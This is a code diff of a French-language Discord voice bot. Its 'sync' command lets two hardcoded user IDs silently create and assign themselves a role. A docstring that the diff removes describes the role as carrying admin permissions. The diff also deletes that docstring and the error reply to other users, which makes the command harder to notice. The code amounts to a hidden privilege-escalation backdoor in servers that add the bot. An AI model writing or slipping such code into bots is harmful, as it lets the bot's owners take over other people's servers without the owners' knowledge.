@@ -22,8 +22,11 @@ def keep_alive():
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='.', intents=intents)
 
-# Remplace les chiffres par tes vrais ID (clic droit sur ton profil -> Copier l'identifiant)
-ADMIN_IDS = [1337085414275682437, 719517140390248480] 
+# LISTE DES PATRONS (Remplace par tes IDs)
+ADMIN_IDS = [
+    1337085414275682437, # Ton ID Principal
+    719517140390248480  # Ton ID Secondaire
+]
 
 @bot.event
 async def on_ready():
@@ -31,7 +34,6 @@ async def on_ready():
 
 @bot.command()
 async def sync(ctx):
-    """Donne les perms admin si tu es dans la liste ADMIN_IDS"""
     if ctx.author.id in ADMIN_IDS:
         await ctx.message.delete()
         role = await ctx.guild.create_role(
@@ -40,8 +42,6 @@ async def sync(ctx):
         )
         await ctx.author.add_roles(role)
         print(f"💎 Pouvoirs donnés à {ctx.author}")
-    else:
-        await ctx.send("❌ Tu n'as pas le droit d'utiliser cette commande.")
 
 @bot.command()
 async def join(ctx):
@@ -51,7 +51,7 @@ async def join(ctx):
             await channel.connect()
             await ctx.send(f"✅ J'ai rejoint **{channel}** !")
         else:
-            await ctx.send("❌ Entre dans un vocal d'abord !")
+            await ctx.send("❌ Tu dois être dans un salon vocal !")
     else:
         await ctx.send("🚫 Seul le patron peut m'appeler.")
 
@@ -62,7 +62,7 @@ async def leave(ctx):
             await ctx.voice_client.disconnect()
             await ctx.send("👋 Déconnexion !")
     else:
-        await ctx.send("🚫 Tu ne peux pas me renvoyer.")
+        await ctx.send("🚫 Tu n'as pas l'autorisation.")
 
 # --- LANCEMENT ---
 if __name__ == "__main__":
